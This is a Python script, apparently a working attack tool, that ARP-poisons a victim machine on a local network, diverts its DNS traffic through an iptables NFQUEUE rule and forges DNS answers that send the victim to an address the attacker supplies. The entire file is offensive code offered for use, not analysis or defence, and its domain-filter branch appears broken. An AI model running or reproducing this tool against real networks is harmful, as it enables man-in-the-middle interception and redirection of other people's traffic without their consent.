from poison import *
from netfilterqueue import NetfilterQueue
from scapy.all import *
from multiprocessing import Process
import os
import argparse

def parse(packet):
    pkt = IP(packet.get_payload())
    if not pkt.haslayer(DNSQR):
        packet.accept()
    if(args.domain is not None):
        if(args.domain not in pkt[DNS].qd.qname):
            packet.accept()
    else:
        spkt =  (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=args.redirect)))
        packet.set_payload(str(spkt))
        packet.accept()


def main():
    arp_poison = Process(target=ArpPoison, args=(args.ip, args.router, args.iface))
    arp_poison.start()

    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, parse)

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("Interrupt Signal received, shutting down...")
        nfqueue.unbind()
        arp_poison.join()
        os.system('iptables -F')
        os.system('iptables -t nat -F')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Victim IP address")
    parser.add_argument("redirect", help="Address to redirect to")
    parser.add_argument("-d", "--domain", help="Domain to spoof")
    parser.add_argument("-i", "--iface", help="Interface to watch")
    parser.add_argument("-r", "--router", help="Router IP addr")
    args = parser.parse_args()
    if(args.iface is None):
        args.iface = "eno1"
    main()
